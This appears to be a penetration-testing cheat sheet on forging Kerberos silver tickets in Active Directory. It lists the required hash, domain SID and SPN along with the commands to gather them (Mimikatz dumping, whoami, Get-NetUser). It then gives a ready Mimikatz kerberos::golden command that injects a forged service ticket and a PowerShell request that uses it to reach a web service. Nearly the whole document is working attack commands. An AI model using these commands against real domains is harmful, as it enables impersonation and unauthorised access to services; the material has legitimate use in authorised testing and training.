# Silver Tickets

Forge a Kerberos TGS (service ticket) using the compromised NTLM hash of a service account. The service trusts the ticket without validating with the DC.

**Required info:**
1. **SPN password hash** (dump with Mimikatz if local admin)
2. **Domain SID** (`whoami /user` → omit the user RID)
3. **Target SPN** (`Get-NetUser -SPN | select samaccountname,serviceprincipalname`)

```cmd
# Forge silver ticket and inject into memory (/ptt)
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<service-account-NTLM-hash> /user:jeffadmin
```

```powershell
# Verify injection
klist

# Access the service (force Kerberos)
iwr -Uri http://web04.corp.com/ -UseDefaultCredentials | Select-Object -ExpandProperty Content
```
